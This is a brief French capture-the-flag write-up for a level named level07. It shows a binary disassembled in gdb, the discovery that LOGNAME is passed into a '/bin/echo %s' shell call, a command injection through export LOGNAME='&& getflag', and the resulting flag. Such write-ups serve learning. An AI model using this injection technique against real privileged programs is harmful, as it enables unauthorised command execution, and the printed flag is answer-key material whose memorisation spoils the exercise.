Dans ce niveau des qu'on ```ls``` on voit un executable ```level07```

Si on disas le main dans gdb on voit un appel a getenv

En cherchant quel variable d'env est cible avec ```x/s 0x8048680``` on trouve ```LOGNAME```

Ensuite il y a un appel a asprintf, on affiche son param avec ```x/s 0x8048688``` et on trouve ```"/bin/echo %s "```

Donc on va modifier la variable d'env ```LOGNAME``` avec ```export LOGNAME="&& getflag"```

Ensuite on execute le prog et la variable est lue comme une commande donc le flag est : ```fiumuikeil55xe9cu4dood66h```